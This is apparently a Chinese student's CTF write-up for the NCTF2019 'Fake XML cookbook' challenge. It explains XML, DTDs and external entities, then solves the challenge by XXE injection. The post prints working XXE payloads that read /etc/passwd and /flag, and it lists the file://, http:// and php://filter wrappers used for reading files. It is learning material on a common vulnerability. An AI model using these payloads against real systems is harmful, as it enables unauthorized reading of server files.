---

title: 初识XML以及xxe——XML外部实体注入

date: 2021-04-06 21:25:05

tags: 练习

categories: test60

---
今天学到了一个新的知识点：xxe漏洞，也就是XML外部实体注入。   

# [NCTF2019]Fake XML cookbook  

其实题目已经提示的很清楚了，这道题目和XML有关，可是做这道题目之前根本不知道什么是XML，对着题目只能挠头，没办法，只能先简单学习一下这个新的知识点了。  

具体学习参考的博客会放在下面，这里就简单讲一下我的理解。  

	什么是 XML？
	XML 指可扩展标记语言（EXtensible Markup Language）。
	XML 的设计宗旨是传输数据，而不是显示数据。
	XML 是 W3C 的推荐标准。
	XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。
	XML 语言没有预定义的标签。

	XML 和 HTML 之间的差异
	XML 不是 HTML 的替代。
	XML 和 HTML 为不同的目的而设计：

    XML 被设计用来传输和存储数据，其焦点是数据的内容。
    HTML 被设计用来显示数据，其焦点是数据的外观。
    HTML 旨在显示信息，而 XML 旨在传输信息。
	
	为什么需要XML
	现实生活中一些数据之间往往存在一定的关系。我们希望能在计算机中保存和处理这些数据的同时能够保存和处理他们之间的关系。XML就是为了解决这样的需求而产生数据存储格式。  

简单来说，xml就是用来传输和储存数据的一种语言。而它的格式和基本语法如下：  

	<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!--xml文件的声明-->
	<bookstore>                                                 <!--根元素-->
	<book category="COOKING">        <!--bookstore的子元素，category为属性-->
	<title>Everyday Italian</title>           <!--book的子元素，lang为属性-->
	<author>Giada De Laurentiis</author>                  <!--book的子元素-->
	<year>2005</year>                                     <!--book的子元素-->
	<price>30.00</price>                                  <!--book的子元素-->
	</book>                                                 <!--book的结束-->
	</bookstore>                                       <!--bookstore的结束-->  

	基本语法：

    所有 XML 元素都须有关闭标签。
    XML 标签对大小写敏感。
    XML 必须正确地嵌套。
    XML 文档必须有根元素。
    XML 的属性值须加引号。


可以看到这个语言和html语言有点像，而这个XML外部实体注入注入方式就是利用程序解析XML输入时，没有进制外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。    

说白了也就是防御不严，导致恶意的XML代码被执行了。这一点我们可以想到之前学习到的xxs攻击，它也是恶意的js代码被执行而导致的漏洞，他们两个这一点上还是有一定相似的。  

那么我们说的外部实体注入中的外部实体指的是什么呢？在讲这个之前，我们要再了解一下另一个概念：**DTD**  

	DTD基本概念
	XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的。
	DTD用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。是XML文档中的几条语句，用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。

	实体引用
	XML元素以形如 <tag>foo</tag> 的标签开始和结束，如果元素内部出现如< 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义五个实体引用，即用&lt; &gt; &amp; &apos; &quot; 替换 < > & ' " 。

	实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行。
	dtd的引入方式

	DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。  


简单来讲这个DTD的实体引用有点像我敲c++代码时最开始的include和定义变量的结合，它既定义了元素的类型，又能引用资源（类似于代码中引用一些库）。  

下面看一下内部引用的示例代码   

	<!DOCTYPE 根元素名称 [元素声明]>  
	<?xml version="1.0"?>
	<!DOCTYPE note [<!--定义此文档是 note 类型的文档-->
	<!ELEMENT note (to,from,heading,body)><!--定义note元素有四个元素-->
	<!ELEMENT to (#PCDATA)><!--定义to元素为”#PCDATA”类型-->
	<!ELEMENT from (#PCDATA)><!--定义from元素为”#PCDATA”类型-->
	<!ELEMENT head (#PCDATA)><!--定义head元素为”#PCDATA”类型-->
	<!ELEMENT body (#PCDATA)><!--定义body元素为”#PCDATA”类型-->
	]>
	<note>
	<to>Y0u</to>
	<from>@re</from>
	<head>v3ry</head>
	<body>g00d!</body>
	</note>  

外部引用如下：  

	（1）引入外部的dtd文件
	
	<!DOCTYPE 根元素名称 SYSTEM "dtd路径">
	
	（2）使用外部的dtd文件(网络上的dtd文件)
	
	<!DOCTYPE 根元素 PUBLIC "DTD名称" "DTD文档的URL">

当使用外部DTD时，通过如下语法引入：
	
	<!DOCTYPE root-element SYSTEM "filename">
	
	示例代码：
	
	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE root-element SYSTEM "test.dtd">
	<note>
	<to>Y0u</to>
	<from>@re</from>
	<head>v3ry</head>
	<body>g00d!</body>
	</note>
	
	test.dtd
	
	<!ELEMENT to (#PCDATA)><!--定义to元素为”#PCDATA”类型-->
	<!ELEMENT from (#PCDATA)><!--定义from元素为”#PCDATA”类型-->
	<!ELEMENT head (#PCDATA)><!--定义head元素为”#PCDATA”类型-->
	<!ELEMENT body (#PCDATA)><!--定义body元素为”#PCDATA”类型-->

接下来就是DTD实体了，也就是本次XML外部实体注入的关键  

	DTD实体
	
	    实体是用于定义引用普通文本或特殊字符的快捷方式的变量。
	    实体引用是对实体的引用。
	    实体可在内部或外部进行声明。
	
	按实体有无参分类，实体分为一般实体和参数实体
	一般实体的声明：<!ENTITY 实体名称 "实体内容">
	引用一般实体的方法：&实体名称;
	ps：经实验，普通实体可以在DTD中引用，可以在XML中引用，可以在声明前引用，还可以在实体声明内部引用。
	
	参数实体的声明：<!ENTITY % 实体名称 "实体内容">
	引用参数实体的方法：%实体名称;
	ps：经实验，参数实体只能在DTD中引用，不能在声明前引用，也不能在实体声明内部引用。
	DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。  

首先我们先来看内部声明实体的代码：  

	内部实体

	<!ENTITY 实体名称 "实体的值">
	
	内部实体示例代码：
	
	<?xml version = "1.0" encoding = "utf-8"?>
	<!DOCTYPE test [
    <!ENTITY writer "Dawn">
    <!ENTITY copyright "Copyright W3School.com.cn">
	]>
	<test>&writer;©right;</test>  

可以看到，这里引用了名称为writer和copyright的DTD实体，而这些实体中就有关于普通文本或特殊字符的快捷方式的引用和定义。  

再接着我们来看一下外部引用：   

	外部实体
	外部实体，用来引入外部资源。有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机。
	
	<!ENTITY 实体名称 SYSTEM "URI/URL">
	或者
	<!ENTITY 实体名称 PUBLIC "public_ID" "URI">
	
	外部实体示例代码：
	
	<?xml version = "1.0" encoding = "utf-8"?>
	<!DOCTYPE test [
    <!ENTITY file SYSTEM "file:///etc/passwd">
    <!ENTITY copyright SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">
	]>
	<author>&file;©right;</author>


这个其实和上面的没有特别大的不同，只不过这个是用来引用外部的实体资源罢了，但是外部实体可支持http、file等协议，所以利用一些常见的协议：   

	file://文件绝对路径 如：file:///etc/passwd
	http://url/file.txt
	php://filter/read=convert.base64-encode/resource=xxx.php
  
那么大致知道这些后我们就可以理出来XML外部注入的原理了，如果程序没有禁止外部引入，并且我们上传数据和文件没有进行过滤且我们可以控制，那么我们就可以构造payload读取任意文件并且使使我们的DTD实体变成读取的文件，最后返回到xml中去。   

下面用一道题来讲解一下：  

打开题目，发现是一个登陆界面  

[![](https://img.imgdb.cn/item/606f34008322e6675c846e30.png)](https://img.imgdb.cn/item/606f34008322e6675c846e30.png)  

经过尝试发现不是sql注入，那么进行抓包分析：  

[![](https://img.imgdb.cn/item/606f343a8322e6675c849bb0.png)](https://img.imgdb.cn/item/606f343a8322e6675c849bb0.png)  

看的出来时xml形式来传递数据username和password的，那么我们尝试能否外部注入。   

这样构造payload：   

	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE user [
	 <!ENTITY xxe SYSTEM "file:///etc/passwd">
	 ]>
	<user><username>&xxe;</username><password>&xxe;</password></user>  

可以看到，这里我们外部引用了名称为xxe的DTD实体，这个实体是来自我们使用file://协议读取/etc/passwd下的文件，那么在 xml 中 &xxe; 变成了外部文件/etc/passwd中内容，这也就导致了文件信息的泄露。  

可以看到回显显示我们成功读取到了文件下的内容  

[![](https://img.imgdb.cn/item/606f35958322e6675c85c91c.png)](https://img.imgdb.cn/item/606f35958322e6675c85c91c.png)  

那么接下来我们就可以按照这个方法来读取flag文件，按照做题经验，flag一般都在根目录，那么我们构造payload。  

	<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE user [
	 <!ENTITY xxe SYSTEM "file:///flag">
	 ]>
	<user><username>&xxe;</username><password>&xxe;</password></user>  

确实得到flag。   

[![](https://img.imgdb.cn/item/606f360a8322e6675c863516.png)](https://img.imgdb.cn/item/606f360a8322e6675c863516.png)  

# 小结  

这道xxe题目算是最简单的题目了，有回显，没有过滤什么的，其实关于xxe还有很多知识，这道题目只能算是开了个头，让我认识到了这样的攻击方式，以后还是要通过不断积累来攒够经验。  

下面附上学习xxe的博客，还是要多看：  

[从XML相关一步一步到XXE漏洞](https://xz.aliyun.com/t/6887#toc-0)  
[浅谈XML实体注入漏洞](https://www.freebuf.com/vuls/175451.html)